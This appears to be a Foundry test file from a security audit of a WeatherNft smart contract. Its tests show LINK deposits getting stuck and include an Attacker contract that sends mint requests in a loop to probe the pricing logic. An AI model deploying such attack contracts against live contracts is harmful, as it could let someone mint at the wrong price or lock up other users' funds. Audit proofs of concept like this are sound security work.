// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test, console} from "forge-std/Test.sol";
import {WeatherNft, WeatherNftStore} from "src/WeatherNft.sol";
import {LinkTokenInterface} from "@chainlink/contracts/src/v0.8/shared/interfaces/LinkTokenInterface.sol";
import {Vm} from "forge-std/Vm.sol";
// My imports
import {Deploy} from "src/Deploy.sol";

contract AuditTest is Test {
    WeatherNft weatherNft;
    LinkTokenInterface linkToken;
    address functionsRouter;
    address user = makeAddr("user");
    // My states
    Deploy deploy;

    function setUp() external {
        // My own addresses
        deploy = new Deploy();
        address linkTokenAddr = deploy.linkTokenAddr();
        address upKeeperAddr = deploy.upKeeperAddr();
        address weatherNftAddr = deploy.weatherNftAddr();
        address routerAddr = deploy.routerAddr();
        // You can replace the weather nft contract with your own deployed contract
        weatherNft = WeatherNft(weatherNftAddr);
        linkToken = LinkTokenInterface(linkTokenAddr);
        functionsRouter = routerAddr;
        vm.deal(user, 1000e18);
        deal(address(linkToken), user, 1000e18);

        // fund weather nft sub
        vm.prank(user);
        linkToken.transferAndCall(functionsRouter, 100e18, abi.encode(15459));
    }

    function testBase() public {
        string memory pincode = "125001";
        string memory isoCode = "IN";
        bool registerKeeper = true;
        uint256 heartbeat = 12 hours;
        uint256 initLinkDeposit = 5e18;
        uint256 tokenId = weatherNft.s_tokenCounter();

        vm.startPrank(user);

        linkToken.approve(address(weatherNft), initLinkDeposit);

        bytes32 reqId = weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
            pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
        );
        vm.stopPrank();

        vm.prank(functionsRouter);
        bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
        weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

        vm.prank(user);
        weatherNft.fulfillMintRequest(reqId);
    }

    function testOnfulfillMintRequestFailDepositedLinkStucks() public {
        string memory pincode = "0000";
        string memory isoCode = "XX";
        bool registerKeeper = true;
        uint256 heartbeat = 12 hours;
        uint256 initLinkDeposit = 5e18;
        uint256 tokenId = weatherNft.s_tokenCounter();

        vm.startPrank(user);

        linkToken.approve(address(weatherNft), initLinkDeposit);

        bytes32 reqId = weatherNft.requestMintWeatherNFT{value: weatherNft.s_currentMintPrice()}(
            pincode, isoCode, registerKeeper, heartbeat, initLinkDeposit
        );
        vm.stopPrank();

        vm.prank(functionsRouter);
        bytes memory weatherResponse = abi.encode(WeatherNftStore.Weather.RAINY);
        weatherNft.handleOracleFulfillment(reqId, weatherResponse, "");

        vm.prank(user);
        vm.expectRevert(WeatherNftStore.WeatherNft__Unauthorized.selector);
        // forcing a revert
        weatherNft.fulfillMintRequest(bytes32("6666"));

        assertEq(linkToken.balanceOf(address(weatherNft)), 5e18);
    }

    function testInfinitMintWithMulticall() public {
        string memory pincode = "125001";
        string memory isoCode = "IN";
        bool registerKeeper = false;
        uint256 heartbeat = 12 hours;
        uint256 initLinkDeposit = 5e18;
        uint256 tokenId = weatherNft.s_tokenCounter();

        vm.startPrank(user);
        Attacker attacker = new Attacker(address(weatherNft));

        attacker.getReqIds{value: 1 ether + 5000}(5);
        vm.stopPrank();
    }
}

contract Attacker {
    // uint256 _currentMintPrice = 1 ether;
    // uint256 _stepIncreasePerMint = 1000;

    WeatherNft weatherNft;
    uint256 stepIncreasePerMint;

    constructor(address _weatherNftAddress) {
        weatherNft = WeatherNft(_weatherNftAddress);
        stepIncreasePerMint = weatherNft.s_stepIncreasePerMint();
    }

    function getReqIds(uint256 totalReqIds) external payable returns (bytes32[5] memory) {
        bytes32[5] memory reqIds;
        bytes32 reqId;
        uint256 currentMintPrice = weatherNft.s_currentMintPrice();
        for (uint256 i = 0; i < totalReqIds; i++) {
            reqId = weatherNft.requestMintWeatherNFT{value: currentMintPrice}("125001", "IN", false, 0, 0);
            reqIds[i] = reqId;
            currentMintPrice += stepIncreasePerMint;
        }

        return reqIds;
    }
}
